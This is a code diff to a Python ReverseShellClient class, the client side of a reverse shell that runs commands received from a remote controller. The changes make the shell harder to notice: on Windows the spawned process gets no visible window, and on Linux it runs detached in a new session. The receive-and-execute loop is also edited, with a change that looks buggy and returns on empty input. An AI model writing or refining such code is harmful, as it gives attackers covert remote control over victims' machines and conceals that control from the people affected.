@@ -45,26 +45,30 @@ class ReverseShellClient:
 
     def run_command(self, cmd):
         try:
-            if os.name == 'nt':  # Windows
+            if os.name == 'nt':  
                 process = subprocess.Popen(
                     cmd,
                     shell=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE
+                    stdin=subprocess.PIPE,
+                    creationflags=subprocess.CREATE_NO_WINDOW  
                 )
-            else:  # Linux
+            else:  
                 process = subprocess.Popen(
-                    ['/bin/bash', '-c', cmd], 
+                    ['/bin/bash', '-c', cmd],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE
+                    stdin=subprocess.PIPE,
+                    start_new_session=True  
                 )
             output, error = process.communicate(timeout=15)
-            return output + error
+            combined = output.decode('utf-8') + error.decode('utf-8')
+            return combined
         except subprocess.TimeoutExpired:
             process.kill()
             return "Error: Command timed out"
+        
         except Exception as e:
             return f"Error: {e}".encode()
     
@@ -179,9 +183,8 @@ class ReverseShellClient:
                 cmd = self.comm.recv().decode().strip()
                 print("Received command:", cmd)  
                 
-                if not cmd:
-                    continue
-                
+                if not cmd.strip():
+                    return b"Empty command" 
                 if cmd.startswith("cd"):
                     path = cmd[3:]
                     output = self.change_directory(path)
